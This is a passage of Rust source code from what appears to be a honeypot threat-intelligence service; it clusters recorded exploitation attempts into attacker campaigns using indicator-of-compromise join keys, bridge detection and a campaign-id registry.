    pub bridges: Vec<BridgeRecord>,
}

impl RegistryUpdate {
    pub fn is_empty(&self) -> bool {
        self.campaigns.is_empty() && self.members.is_empty() && self.bridges.is_empty()
    }
}

/// Everything clustering reads. Attempts and IOCs must come from the same
/// window build.
pub struct Input<'a> {
    pub tenant_id: &'a str,
    pub attempts: &'a [Attempt],
    pub iocs: &'a Extraction,
    /// By attempt id, from [`attempt_signals`].
    pub signals: &'a BTreeMap<String, AttemptSignals>,
    /// Source address to ASN number, from enrichment Facts (#11).
    pub asns: &'a BTreeMap<String, u32>,
    /// CVE id to advisory publication time in Unix ms (#12).
    pub advisories: &'a BTreeMap<String, i64>,
    /// Every structural action and the newest feedback actions.
    pub actions: &'a [CampaignAction],
    pub registry: &'a Registry,
    /// Unix ms, for `closed` and new registry records.
    pub now: i64,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Params {
    pub join_gap_ms: i64,
    pub closed_after_ms: i64,
}

impl Default for Params {
    fn default() -> Self {
        Params {
            join_gap_ms: DEFAULT_JOIN_GAP_MS,
            closed_after_ms: DEFAULT_CLOSED_AFTER_MS,
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Clustering {
    /// Campaigns with at least two attempts in the window, sorted by first
    /// seen, then id.
    pub campaigns: Vec<Campaign>,
    /// Attempts whose campaign has only them in this window, with that
    /// campaign's id (from the registry or a split).
    pub carried: BTreeMap<String, String>,
    /// Skipped actions, refused bridges and attempts that hit the key cap.
    pub notes: Vec<String>,
    /// Registry writes for the caller to make.
    pub registry_update: RegistryUpdate,
}

impl Clustering {
    pub fn get(&self, campaign_id: &str) -> Option<&Campaign> {
        self.campaigns.iter().find(|c| c.campaign_id == campaign_id)
    }

    /// Campaign id per attempt id, for listed and carried campaigns.
    pub fn membership(&self) -> BTreeMap<&str, &str> {
        self.campaigns
            .iter()
            .flat_map(|c| {
                c.attempt_ids
                    .iter()
                    .map(move |a| (a.as_str(), c.campaign_id.as_str()))
            })
            .chain(self.carried.iter().map(|(a, c)| (a.as_str(), c.as_str())))
            .collect()
    }
}

/// `cmp_` plus 24 hex characters of SHA-256 over the tenant and the seed
/// attempt (the earliest member) of a cluster with no recorded id yet.
/// Once recorded, the registry keeps the id however the window moves.
pub fn campaign_id(tenant_id: &str, seed_attempt_id: &str) -> String {
    hash_id(&format!("{ID_DOMAIN}\n{tenant_id}\n{seed_attempt_id}"))
}

/// Id for the attempts a split action moves out.
pub fn split_campaign_id(tenant_id: &str, action_id: &str) -> String {
    hash_id(&format!("{ID_DOMAIN}\nsplit\n{tenant_id}\n{action_id}"))
}

fn hash_id(s: &str) -> String {
    let h = Sha256::digest(s.as_bytes());
    format!("cmp_{}", hex::encode(&h[..12]))
}

/// True for ids of the `cmp_` form.
pub fn valid_campaign_id(id: &str) -> bool {
    id.strip_prefix("cmp_").is_some_and(|h| {
        h.len() == 24
            && h.bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
    })
}

// ---------------------------------------------------------------------------
// Clustering
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Key {
    feature: Feature,
    value: String,
}

impl Key {
    fn signal_id(&self) -> String {
        let h = Sha256::digest(format!("{}\n{}", self.feature.as_str(), self.value).as_bytes());
        format!(
            "campaign:{}:{}",
            self.feature.as_str(),
            hex::encode(&h[..6])
        )
    }
}

#[derive(Debug, Clone)]
struct KeyInfo {
    display: String,
    ioc_id: Option<String>,
    /// The feature's strength, or `weak` for a medium feature shared by
    /// too many sources to be distinctive.
    strength: Strength,
}

/// Interned join keys: each distinct key is stored once.
#[derive(Default)]
struct Keys {
    keys: Vec<Key>,
    info: Vec<KeyInfo>,
    ids: BTreeMap<Key, usize>,
}

impl Keys {
    fn intern(&mut self, key: Key, display: String, ioc_id: Option<String>) -> usize {
        if let Some(&id) = self.ids.get(&key) {
            return id;
        }
        let id = self.keys.len();
        self.info.push(KeyInfo {
            display,
            ioc_id,
            strength: key.feature.strength(),
        });
        self.ids.insert(key.clone(), id);
        self.keys.push(key);
        id
    }

    /// Strength, then feature, then value.
    fn order(&self, a: usize, b: usize) -> std::cmp::Ordering {
        (self.info[a].strength, &self.keys[a]).cmp(&(self.info[b].strength, &self.keys[b]))
    }
}

fn ip_display(ip: &str) -> String {
    defang(
        if ip.contains(':') {
            IocType::Ipv6
        } else {
            IocType::Ip
        },
        ip,
    )
}

fn has_role(i: &Ioc, roles: &[IocRole]) -> bool {
    i.roles.iter().any(|r| roles.contains(r))
}

/// A fingerprint step that only exploitation and what follows it produce:
/// a command, a callback, a file, a post-exploit hook. Plain requests and
/// a hook firing at `trigger` are what every user of a public exploit
/// shares, so they never make a fingerprint distinctive.
fn distinctive_step(s: &str) -> bool {
    !(s.starts_with("http ")
        || s.starts_with("cmd ")
        || (s.starts_with("hook ") && s.ends_with(" trigger")))
}

/// Every candidate join key of one attempt, deduplicated.
fn candidate_keys(
    a: &Attempt,
    iocs: &BTreeMap<&str, &Ioc>,
    refs: &[String],
    signals: Option<&AttemptSignals>,
    asn: Option<u32>,
    keys: &mut Keys,
) -> Vec<usize> {
    let exploit = a.state >= AttemptState::Exploit;
    let mut out: BTreeSet<usize> = BTreeSet::new();
    let mut add = |keys: &mut Keys, feature: Feature, value: String, display: String, ioc_id| {
        out.insert(keys.intern(Key { feature, value }, display, ioc_id));
    };
    let callback = [IocRole::Callback, IocRole::Stage2];
    let mut paths: Vec<&Ioc> = Vec::new();
    let mut uas: Vec<&Ioc> = Vec::new();
    for r in refs {
        let Some(i) = iocs.get(r.as_str()) else {
            continue;
        };
        let id = Some(i.ioc_id.clone());
        let lower = || i.value.to_ascii_lowercase();
        match i.ioc_type {
            IocType::PayloadSha256 if lower() != EMPTY_SHA256 => {
                add(keys, Feature::PayloadSha256, lower(), i.display.clone(), id);
            }
            IocType::FileSha256 if lower() != EMPTY_SHA256 => {
                add(keys, Feature::FileSha256, lower(), i.display.clone(), id);
            }
            IocType::Url if has_role(i, &callback) => {
                add(
                    keys,
                    Feature::Stage2Url,
                    i.value.clone(),
                    i.display.clone(),
                    id,
                );
            }
            IocType::Domain | IocType::DnsQuery if has_role(i, &callback) => {
                let name = lower().trim_end_matches('.').to_string();
                let display = defang(IocType::Domain, &name);
                add(keys, Feature::CallbackDomain, name, display, id);
            }
            IocType::Ip | IocType::Ipv6 if has_role(i, &callback) => {
                add(keys, Feature::CallbackIp, lower(), i.display.clone(), id);
            }
            IocType::BehaviourFingerprint
                if i.fingerprint
                    .as_ref()
                    .is_some_and(|f| f.steps.iter().any(|s| distinctive_step(s))) =>
            {
                add(
                    keys,
                    Feature::BehaviourFingerprint,
                    lower(),
                    i.display.clone(),
                    id,
                );
            }
            IocType::Cmdline => add(
                keys,
                Feature::Cmdline,
                i.value.clone(),
                i.display.clone(),
                id,
            ),
            IocType::RequestSubstring if exploit => {
                add(
                    keys,
                    Feature::RequestSubstring,
                    i.value.clone(),
                    i.display.clone(),
                    id,
                );
            }
            IocType::HttpPath if exploit => paths.push(i),
            IocType::HttpUa if exploit => uas.push(i),
            _ => {}
        }
    }
    let mut shapes = 0;
    'shapes: for p in &paths {
        for u in &uas {
            if shapes == MAX_REQUEST_SHAPES {
                break 'shapes;
            }
            shapes += 1;
            add(
                keys,
                Feature::RequestShape,
                format!("{}\n{}", p.value, u.value),
                format!("{} with {}", p.display, u.display),
                None,
            );
        }
    }
    if exploit {
        add(
            keys,
            Feature::SrcIp,
            a.src.to_ascii_lowercase(),
            ip_display(&a.src),
            None,
        );
        if let Some(asn) = asn {
            let mut cves: BTreeSet<String> = a
                .hook_hits
                .iter()
                .filter_map(|h| h.cve_id.as_deref())
                .map(str::to_ascii_uppercase)
                .collect();
            if let Some(s) = signals {
                cves.extend(s.cves.iter().map(|c| c.to_ascii_uppercase()));
            }
            for c in cves {
                add(
                    keys,
                    Feature::AsnCve,
                    format!("AS{asn}\n{c}"),
                    format!("AS{asn} and {}", printable(&c)),
                    None,
                );
            }
            if let Some(s) = signals.filter(|s| !s.techniques.is_empty()) {
                let set: Vec<&str> = s.techniques.iter().map(String::as_str).collect();
                let joined = set.join(",");
                add(
                    keys,
                    Feature::AsnTechniques,
                    format!("AS{asn}\n{joined}"),
                    format!("AS{asn} and {}", printable(&joined)),
                    None,
                );
            }
        }
    }
    out.into_iter().collect()
}

/// How one attempt's joinable keys are ranked for the cap.
struct KeyStats<'a> {
    /// Attempts holding each key.
    held_by: &'a [usize],
    /// Distinct sources holding each key.
    sources: &'a [usize],
    /// Keys this attempt shares with another attempt recorded in the same
    /// campaign: the evidence that joined it before.
    recorded: &'a BTreeSet<usize>,
}

/// Keep the keys that can join (held by two or more attempts): first the
/// keys this attempt shares with its recorded campaign, then strongest
/// first, then the keys held by the most distinct sources (evidence that
/// joins more of the fleet wins), at most [`MAX_KEYS_PER_FEATURE`] per
/// feature and [`MAX_FEATURES_PER_ATTEMPT`] in all. Junk values are held by
/// the sender's own attempts only, so they rank below a value many sources
/// share, and no feature can crowd out the others. Returns the kept keys and
/// how many joinable keys were dropped.
fn select_keys(cands: &[usize], keys: &Keys, stats: &KeyStats<'_>) -> (Vec<usize>, usize) {
    let mut joinable: Vec<usize> = cands
        .iter()
        .copied()
        .filter(|&k| stats.held_by[k] >= 2)
        .collect();
    let rank = |k: usize| {
        (
            !stats.recorded.contains(&k),
            keys.info[k].strength,
            std::cmp::Reverse(stats.sources[k]),
            std::cmp::Reverse(stats.held_by[k]),
        )
    };
    joinable.sort_by(|&a, &b| rank(a).cmp(&rank(b)).then_with(|| keys.order(a, b)));
    let mut per_feature: BTreeMap<Feature, usize> = BTreeMap::new();
    let mut kept = Vec::new();
    for &k in &joinable {
        if kept.len() == MAX_FEATURES_PER_ATTEMPT {
            break;
        }
        let n = per_feature.entry(keys.keys[k].feature).or_default();
        // Recorded evidence is never crowded out by the quota.
        if *n < MAX_KEYS_PER_FEATURE || stats.recorded.contains(&k) {
            *n += 1;
            kept.push(k);
        }
    }
    let dropped = joinable.len() - kept.len();
    (kept, dropped)
}

struct Dsu {
    parent: Vec<usize>,
    size: Vec<usize>,
    /// Holds a cluster formed by strong or medium features, or a member of
    /// a recorded campaign.
    established: Vec<bool>,
}

impl Dsu {
    fn new(n: usize) -> Self {
        Dsu {
            parent: (0..n).collect(),
            size: vec![1; n],
            established: vec![false; n],
        }
    }

    fn find(&mut self, mut x: usize) -> usize {
        while self.parent[x] != x {
            self.parent[x] = self.parent[self.parent[x]];
            x = self.parent[x];
        }
        x
    }

    fn union(&mut self, a: usize, b: usize) {
        let (a, b) = (self.find(a), self.find(b));
        if a == b {
            return;
        }
        // Larger tree is the root; ties go to the lower index.
        let (root, child) = if (self.size[a], b) >= (self.size[b], a) {
            (a, b)
        } else {
            (b, a)
        };
        self.parent[child] = root;
        self.size[root] += self.size[child];
        self.established[root] |= self.established[child];
    }
}

/// A cluster while analyst actions are replayed.
struct Group {
    seed: usize,
    members: BTreeSet<usize>,
    added_by: BTreeMap<usize, AddedBy>,
    analyst: AnalystState,
    possible_links: Vec<PossibleLink>,
}

/// A link refused by [`split_single_source_bridges`], by attempt index.
struct RawLink {
    /// The source's attempts, attached to `kept`'s part.
    attempts: Vec<usize>,
    /// An attempt in the part they were attached to.
    kept: usize,
    /// An attempt in each other established part they touched.
    others: Vec<usize>,
    /// The keys that made the link.
    keys: BTreeSet<usize>,
}

/// Nodes whose removal leaves at least two parts of `min` or more weight
/// in their connected component (articulation points, by Tarjan's
/// algorithm, iterative so deep chains cannot overflow the stack). Linear
/// in nodes plus edges.
fn heavy_articulations(adj: &[Vec<usize>], weight: &[usize], min: usize) -> Vec<bool> {
    let n = adj.len();
    let unseen = usize::MAX;
    let mut disc = vec![unseen; n];
    let mut low = vec![0usize; n];
    let mut sub = vec![0usize; n];
    let mut parent = vec![unseen; n];
    let mut separated: Vec<Vec<usize>> = vec![Vec::new(); n];
    let mut out = vec![false; n];
    let mut time = 0usize;
    for root in 0..n {
        if disc[root] != unseen {
            continue;
        }
        let mut tree = vec![root];
        let mut stack: Vec<(usize, usize)> = vec![(root, 0)];
        disc[root] = time;
        low[root] = time;
        sub[root] = weight[root];
        time += 1;
        while let Some(&(v, i)) = stack.last() {
            if i < adj[v].len() {
                stack.last_mut().expect("non-empty").1 += 1;
                let w = adj[v][i];
                if disc[w] == unseen {
                    parent[w] = v;
                    disc[w] = time;
                    low[w] = time;
                    sub[w] = weight[w];
                    time += 1;
                    tree.push(w);
                    stack.push((w, 0));
                } else if w != parent[v] {
                    low[v] = low[v].min(disc[w]);
                }
            } else {
                stack.pop();
                if let Some(&(p, _)) = stack.last() {
                    low[p] = low[p].min(low[v]);
                    sub[p] += sub[v];
                    if low[v] >= disc[p] {
                        separated[p].push(sub[v]);
                    }
                }
            }
        }
        let total = sub[root];
        for &v in &tree {
            let cut: usize = separated[v].iter().sum();
            let mut parts = separated[v].clone();
            if v != root {
                parts.push(total - weight[v] - cut);
            }
            if parts.iter().filter(|&&p| p >= min).count() >= 2 {
                out[v] = true;
            }
        }
    }
    out
}

/// After pass 1 and the registry chain: find sources whose attempts alone
/// join two parts of a cluster that each hold at least
/// [`BRIDGE_MIN_ATTEMPTS`] attempts (a forged bridge: one attempt carrying
/// two campaigns' public bodies). The check runs on a bipartite graph of
/// source nodes (attempts contracted per cluster and source, so two
/// bridging attempts from one source count once and two from distinct
/// sources keep the join) and join nodes (one per key segment within the
/// join gap, and one per recorded campaign), so it stays linear. Each
/// bridging source is attached to the adjacent part with the oldest
/// recorded campaign (else the earliest attempt), and the other heavy parts
/// stay apart as possible links. Returns the rebuilt union-find and the
/// refused links, or `None` when nothing changes.
fn split_single_source_bridges(
    dsu: &mut Dsu,
    attempts: &[&Attempt],
    segments: &[(usize, Vec<usize>)],
    rank: &dyn Fn(usize) -> (i64, usize),
) -> Option<(Dsu, Vec<RawLink>)> {
    let n = attempts.len();
    let mut node_ids: BTreeMap<(usize, &str), usize> = BTreeMap::new();
    let mut node_of = vec![0usize; n];
    let mut weight: Vec<usize> = Vec::new();
    for (i, a) in attempts.iter().enumerate() {
        let key = (dsu.find(i), a.src.as_str());
        let next = node_ids.len();
        let id = *node_ids.entry(key).or_insert(next);
        if id == weight.len() {
            weight.push(0);
        }
        weight[id] += 1;
        node_of[i] = id;
    }
    let sources = weight.len();
    let mut adj: Vec<BTreeSet<usize>> = vec![BTreeSet::new(); sources + segments.len()];
    for (s, (_, holders)) in segments.iter().enumerate() {
        let join = sources + s;
        for &h in holders {
            adj[join].insert(node_of[h]);
            adj[node_of[h]].insert(join);
        }
    }
    weight.resize(adj.len(), 0);
    let adj: Vec<Vec<usize>> = adj.into_iter().map(|s| s.into_iter().collect()).collect();
    let heavy = heavy_articulations(&adj, &weight, BRIDGE_MIN_ATTEMPTS);
    let bridging: Vec<bool> = (0..sources).map(|v| heavy[v]).collect();
    if !bridging.iter().any(|&b| b) {
        return None;
    }
    let is_bridge = |i: usize| bridging[node_of[i]];

    // Rebuild without the bridging sources.
    let mut d2 = Dsu::new(n);
    for (_, holders) in segments {
        let mut kept = holders.iter().copied().filter(|&h| !is_bridge(h));
        if let Some(first) = kept.next() {
            for h in kept {
                d2.union(first, h);
            }
        }
    }
    let mut parts: BTreeMap<usize, Vec<usize>> = BTreeMap::new();
    for i in (0..n).filter(|&i| !is_bridge(i)) {
        let r = d2.find(i);
        parts.entry(r).or_default().push(i);
    }
    let part_rank = |r: &usize| {
        parts
            .get(r)
            .and_then(|members| members.iter().map(|&m| rank(m)).min())
    };

    // Attach each bridging source, in node order, to its oldest part.
    let mut by_node: BTreeMap<usize, Vec<usize>> = BTreeMap::new();
    for i in (0..n).filter(|&i| is_bridge(i)) {
        by_node.entry(node_of[i]).or_default().push(i);
    }
    let mut links = Vec::new();
    for members in by_node.into_values() {
        let mut touched: BTreeMap<usize, BTreeSet<usize>> = BTreeMap::new();
        for (key, holders) in segments {
            if holders.iter().any(|h| members.contains(h)) {
                for &h in holders.iter().filter(|&&h| !is_bridge(h)) {
                    let r = d2.find(h);
                    touched.entry(r).or_default().insert(*key);
                }
            }
        }
        let Some(&kept) = touched.keys().min_by_key(|r| part_rank(r)) else {
            continue;
        };
        for &m in &members {
            d2.union(kept, m);
        }
        let others: Vec<usize> = touched
            .keys()
            .copied()
            .filter(|r| *r != kept && parts.get(r).is_some_and(|p| p.len() >= BRIDGE_MIN_ATTEMPTS))
            .collect();
        if !others.is_empty() {
            links.push(RawLink {
                attempts: members.clone(),
                kept,
                // The registry join node is not a feature.
                keys: touched
                    .values()
                    .flatten()
                    .copied()
                    .filter(|&k| k != usize::MAX)
                    .collect(),
                others,
            });
        }
    }
    Some((d2, links))
}

/// One union in pass 1 that joined two groups rather than growing one:
/// both sides held two or more attempts, or held attempts recorded in
/// different campaigns. Every such merge the registry makes permanent gets
/// a bridge record.
struct MergeEvent<'a> {
    key: usize,
    p: usize,
    c: usize,
    /// Attempts on each side when they joined.
    sides: (usize, usize),
    /// Recorded campaigns on each side when they joined.
    stored: (BTreeSet<&'a str>, BTreeSet<&'a str>),
}

/// Cluster a tenant's attempts into campaigns, keep ids from the registry,
/// and apply analyst actions.
pub fn cluster(input: &Input<'_>, params: Params, cfg: &ConfidenceConfig) -> Clustering {
    let mut attempts: Vec<&Attempt> = input
        .attempts
        .iter()
        .filter(|a| a.tenant_id == input.tenant_id)
        .collect();
    attempts.sort_by(|a, b| (a.first_seen, &a.attempt_id).cmp(&(b.first_seen, &b.attempt_id)));
    attempts.dedup_by(|a, b| a.attempt_id == b.attempt_id);
    let n = attempts.len();
    let idx_of: BTreeMap<&str, usize> = attempts
        .iter()
        .enumerate()
        .map(|(i, a)| (a.attempt_id.as_str(), i))
        .collect();
    let ioc_index: BTreeMap<&str, &Ioc> = input
        .iocs
        .iocs
        .iter()
        .map(|i| (i.ioc_id.as_str(), i))
        .collect();
    let refs: BTreeMap<&str, &[String]> = input
        .iocs
        .attempts
        .iter()
        .map(|x| (x.attempt_id.as_str(), x.ioc_refs.as_slice()))
        .collect();
    // The recorded (live) campaign of each attempt, if any.
    let stored: Vec<Option<&str>> = attempts
        .iter()
        .map(|a| {
            input
                .registry
                .members
                .get(&a.attempt_id)
                .map(|c| input.registry.resolve(c))
        })
        .collect();

    // Candidate keys, interned.
    let mut keys = Keys::default();
    let cands: Vec<Vec<usize>> = attempts
        .iter()
        .map(|a| {
            candidate_keys(
                a,
                &ioc_index,
                refs.get(a.attempt_id.as_str()).copied().unwrap_or(&[]),
                input.signals.get(&a.attempt_id),
                input.asns.get(&a.src).copied(),
                &mut keys,
            )
        })
        .collect();

    // How many attempts, distinct sources and recorded campaigns hold each
    // key.
    let nk = keys.keys.len();
    let mut held_by = vec![0usize; nk];
    let mut source_sets: Vec<BTreeSet<&str>> = vec![BTreeSet::new(); nk];
    let mut per_campaign: BTreeMap<(usize, &str), usize> = BTreeMap::new();
    for (i, c) in cands.iter().enumerate() {
        for &k in c {
            held_by[k] += 1;
            source_sets[k].insert(attempts[i].src.as_str());
            if let Some(s) = stored[i] {
                *per_campaign.entry((k, s)).or_default() += 1;
            }
        }
    }
    let sources: Vec<usize> = source_sets.iter().map(BTreeSet::len).collect();
    drop(source_sets);
    // Rarity, for behaviour fingerprints only: one shared by many of the
    // window's sources is what a public exploit or tool looks like, not one
    // operator. Other medium features (command lines, request strings) are
    // what a botnet wave shares, so they keep their strength.
    let all_sources = attempts
        .iter()
        .map(|a| a.src.as_str())
        .collect::<BTreeSet<_>>()
        .len();
    for (k, &s) in sources.iter().enumerate() {
        let common =
            s > COMMON_MAX_SOURCES || (all_sources >= COMMON_MIN_POPULATION && s * 4 > all_sources);
        if common && keys.keys[k].feature == Feature::BehaviourFingerprint {
            keys.info[k].strength = Strength::Weak;
        }
    }

    // Blocking on the kept keys: one posting list per key, in time order.
    let mut index: BTreeMap<usize, Vec<usize>> = BTreeMap::new();
    let mut keys_of: Vec<Vec<usize>> = Vec::with_capacity(n);
    let mut notes = Vec::new();
    let mut capped: BTreeMap<usize, usize> = BTreeMap::new();
    for (i, c) in cands.iter().enumerate() {
        let recorded: BTreeSet<usize> = match stored[i] {
            Some(s) => c
                .iter()
                .copied()
                .filter(|&k| per_campaign.get(&(k, s)).is_some_and(|&n| n >= 2))
                .collect(),
            None => BTreeSet::new(),
        };
        let stats = KeyStats {
            held_by: &held_by,
            sources: &sources,
            recorded: &recorded,
        };
        let (kept, dropped) = select_keys(c, &keys, &stats);
        if dropped > 0 {
            capped.insert(i, dropped);
        }
        for &k in &kept {
            index.entry(k).or_default().push(i);
        }
        keys_of.push(kept);
    }
    for (&i, dropped) in capped.iter().take(MAX_CAP_NOTES) {
        notes.push(format!(
            "Attempt {} had {dropped} more shared feature(s) than the cap; the least shared \
             were not used.",
            attempts[i].attempt_id
        ));
    }
    if capped.len() > MAX_CAP_NOTES {
        notes.push(format!(
            "{} more attempt(s) hit the feature cap.",
            capped.len() - MAX_CAP_NOTES
        ));
    }

    // Union-find. Pass 1: strong and medium keys. Then the registry joins
    // attempts recorded in the same campaign; it only ever records joins
    // made by strong or medium features, so this re-applies evidence seen
    // in an earlier window. Pass 2: weak keys, which may attach stragglers
    // but never bridge two established clusters (a recorded attempt counts
    // as established).
    let mut dsu = Dsu::new(n);
    let mut edges: Vec<Vec<(usize, usize)>> = vec![Vec::new(); n];
    let mut refused = 0usize;
    let mut order: Vec<usize> = index.keys().copied().collect();
    // Key order (strength, feature, value) keeps the walk deterministic.
    order.sort_by(|&a, &b| keys.order(a, b));
    let mut core: Vec<usize> = Vec::new();
    let mut raw_links: Vec<RawLink> = Vec::new();
    // Recorded campaigns per pass-1 root, and the merges pass 1 made.
    let mut root_stored: Vec<BTreeSet<&str>> =
        stored.iter().map(|s| s.iter().copied().collect()).collect();
    let mut merges: Vec<MergeEvent<'_>> = Vec::new();
    for weak_pass in [false, true] {
        if weak_pass {
            // Registry: attempts recorded in one campaign stay together.
            let mut last_of: BTreeMap<&str, usize> = BTreeMap::new();
            for (i, s) in stored.iter().enumerate() {
                if let Some(s) = s {
                    if let Some(&p) = last_of.get(s) {
                        dsu.union(p, i);
                    }
                    last_of.insert(s, i);
                }
            }
            // One source alone must not hold two established parts
            // together; a link like that stays a possible link.
            let rank = |m: usize| {
                (
                    stored[m].map_or(i64::MAX, |id| {
                        input
                            .registry
                            .campaigns
                            .get(id)
                            .map_or(i64::MAX, |c| c.created_at)
                    }),
                    m,
                )
            };
            // Join nodes for the guard: each strong or medium key's holders
            // within the join gap, and each recorded campaign's attempts
            // (registry key `usize::MAX`).
            let mut segments: Vec<(usize, Vec<usize>)> = Vec::new();
            for &k in &order {
                if keys.info[k].strength == Strength::Weak {
                    continue;
                }
                let mut seg: Vec<usize> = Vec::new();
                for &h in &index[&k] {
                    if let Some(&p) = seg.last()
                        && attempts[h].first_seen - attempts[p].last_seen > params.join_gap_ms
                    {
                        if seg.len() >= 2 {
                            segments.push((k, std::mem::take(&mut seg)));
                        }
                        seg.clear();
                    }
                    seg.push(h);
                }
                if seg.len() >= 2 {
                    segments.push((k, seg));
                }
            }
            let mut recorded: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
            for (i, s) in stored.iter().enumerate() {
                if let Some(s) = s {
                    recorded.entry(s).or_default().push(i);
                }
            }
            segments.extend(
                recorded
                    .into_values()
                    .filter(|m| m.len() >= 2)
                    .map(|m| (usize::MAX, m)),
            );
            if let Some((d2, links)) =
                split_single_source_bridges(&mut dsu, &attempts, &segments, &rank)
            {
                dsu = d2;
                raw_links = links;
            }
            for (i, s) in stored.iter().enumerate() {
                let r = dsu.find(i);
                if dsu.size[r] >= 2 || s.is_some() {
                    dsu.established[r] = true;
                }
            }
            core = (0..n).map(|i| dsu.find(i)).collect();
        }
        for &k in &order {
            if (keys.info[k].strength == Strength::Weak) != weak_pass {
                continue;
            }
            for w in index[&k].windows(2) {
                let (p, c) = (w[0], w[1]);
                if attempts[c].first_seen - attempts[p].last_seen > params.join_gap_ms {
                    continue;
                }
                let (rp, rc) = (dsu.find(p), dsu.find(c));
                if rp != rc {
                    if weak_pass && dsu.established[rp] && dsu.established[rc] {
                        refused += 1;
                        continue;
                    }
                    if !weak_pass {
                        // A merge, not growth: two groups of two or more,
                        // or two attempts recorded in different campaigns.
                        let (sp, sc) = (&root_stored[rp], &root_stored[rc]);
                        let distinct = !sp.is_empty() && !sc.is_empty() && sp.is_disjoint(sc);
                        if (dsu.size[rp] >= 2 && dsu.size[rc] >= 2) || distinct {
                            merges.push(MergeEvent {
                                key: k,
                                p,
                                c,
                                sides: (dsu.size[rp], dsu.size[rc]),
                                stored: (sp.clone(), sc.clone()),
                            });
                        }
                        let moved = std::mem::take(&mut root_stored[rp]);
                        let other = std::mem::take(&mut root_stored[rc]);
                        dsu.union(rp, rc);
                        let r = dsu.find(rp);
                        root_stored[r] = moved.union(&other).copied().collect();
                    } else {
                        dsu.union(rp, rc);
                    }
                }
                edges[p].push((k, c));
                edges[c].push((k, p));
            }
        }
    }
    if refused > 0 {
        notes.push(format!(
            "{refused} weak feature join(s) were not used because they would have bridged two \
             established campaigns."
        ));
    }

    // Final groups. Each holds at most one established core (the weak pass
    // never joins two); the id comes from that core: its oldest recorded
    // id, else its earliest attempt.
    let mut by_root: BTreeMap<usize, BTreeSet<usize>> = BTreeMap::new();
    for i in 0..n {
        let r = dsu.find(i);
        by_root.entry(r).or_default().insert(i);
    }
    let created = |id: &str| {
        input
            .registry
            .campaigns
            .get(id)
            .map_or(i64::MAX, |c| c.created_at)
    };
    let mut core_size: BTreeMap<usize, usize> = BTreeMap::new();
    for &c in &core {
        *core_size.entry(c).or_default() += 1;
    }
    let is_core =
        |i: usize| core_size.get(&core[i]).is_some_and(|&s| s >= 2) || stored[i].is_some();
    let mut groups: BTreeMap<String, Group> = BTreeMap::new();
    let mut member_of: Vec<Option<String>> = vec![None; n];
    let mut cores: BTreeMap<String, BTreeSet<usize>> = BTreeMap::new();
    for members in by_root.into_values() {
        let recorded = members.iter().any(|&m| stored[m].is_some());
        if members.len() < 2 && !recorded {
            continue;
        }
        let core_members: BTreeSet<usize> =
            members.iter().copied().filter(|&m| is_core(m)).collect();
        let basis = if core_members.is_empty() {
            &members
        } else {
            &core_members
        };
        let seed = *basis.iter().next().expect("non-empty");
        let id = basis
            .iter()
            .filter_map(|&m| stored[m])
            .min_by_key(|id| (created(id), *id))
            .map(str::to_string)
            .unwrap_or_else(|| campaign_id(input.tenant_id, &attempts[seed].attempt_id));
        for &m in &members {
            member_of[m] = Some(id.clone());
        }
        cores.insert(id.clone(), core_members);
        groups.insert(
            id,
            Group {
                seed,
                members,
                added_by: BTreeMap::new(),
                analyst: AnalystState::default(),
                possible_links: Vec::new(),
            },
        );
    }
    for l in &raw_links {
        let (Some(kept), Some(first)) = (member_of[l.kept].clone(), l.attempts.first()) else {
            continue;
        };
        let others: BTreeSet<String> = l
            .others
            .iter()
            .filter_map(|&o| member_of[o].clone())
            .filter(|o| *o != kept)
            .collect();
        if others.is_empty() {
            continue;
        }
        let src = ip_display(&attempts[*first].src);
        let mut signal_ids: Vec<String> =
            l.keys.iter().map(|&k| keys.keys[k].signal_id()).collect();
        signal_ids.sort();
        signal_ids.dedup();
        signal_ids.truncate(MAX_BRIDGE_RECORDS);
        let attempt_ids: Vec<String> = l
            .attempts
            .iter()
            .map(|&m| attempts[m].attempt_id.clone())
            .collect();
        notes.push(format!(
            "Attempts from {src} were the only link between campaign {kept} and {}; they are \
             kept apart as a possible link. An analyst can merge them.",
            others.iter().cloned().collect::<Vec<_>>().join(", ")
        ));
        if let Some(g) = groups.get_mut(&kept) {
            g.possible_links.push(PossibleLink {
                other_campaign_ids: others.iter().cloned().collect(),
                attempt_ids: attempt_ids.clone(),
                src: src.clone(),
                signal_ids: signal_ids.clone(),
            });
        }
        for o in &others {
            if let Some(g) = groups.get_mut(o) {
                g.possible_links.push(PossibleLink {
                    other_campaign_ids: vec![kept.clone()],
                    attempt_ids: attempt_ids.clone(),
                    src: src.clone(),
                    signal_ids: signal_ids.clone(),
                });
            }
        }
    }

    // The registry records live clustering only, before analyst actions:
    // merges and splits are replayed from the actions on every read.
    let registry_update = registry_update(
        input, &attempts, &stored, &keys, &edges, &groups, &cores, &merges,
    );

    apply_actions(
        input,
        &idx_of,
        &edges,
        &mut groups,
        &mut member_of,
        &mut notes,
    );

    // Visible decoys per product, for the targeting pattern.
    let mut decoys_by_product: BTreeMap<&str, BTreeSet<&str>> = BTreeMap::new();
    for a in &attempts {
        decoys_by_product
            .entry(a.catalogue_id.as_str())
            .or_default()
            .insert(a.decoy_id.as_str());
    }
    let ctx = BuildCtx {
        input,
        params,
        cfg,
        attempts: &attempts,
        keys_of: &keys_of,
        edges: &edges,
        keys: &keys,
        refs: &refs,
        decoys_by_product: &decoys_by_product,
        capped: &capped,
        bridges: &registry_update.bridges,
    };
    let mut campaigns: Vec<Campaign> = Vec::new();
    let mut carried = BTreeMap::new();
    for (id, g) in groups {
        if g.members.len() < 2 {
            for &m in &g.members {
                carried.insert(attempts[m].attempt_id.clone(), id.clone());
            }
            continue;
        }
        campaigns.push(build_campaign(&ctx, id, g));
    }
    campaigns.sort_by(|a, b| (a.first_seen, &a.campaign_id).cmp(&(b.first_seen, &b.campaign_id)));
    Clustering {
        campaigns,
        carried,
        notes,
        registry_update,
    }
}

/// Registry writes from live clustering (before analyst actions). Only
/// established memberships are recorded: an attempt joined to its group by
/// a strong or medium feature. Weak joins, registry carry-overs and analyst
/// actions never write memberships, so the registry can only re-apply
/// evidence strong enough to join on its own. A recorded campaign whose
/// attempts now sit in another campaign's established core (a strong or
/// medium bridge) is recorded as merged into it.
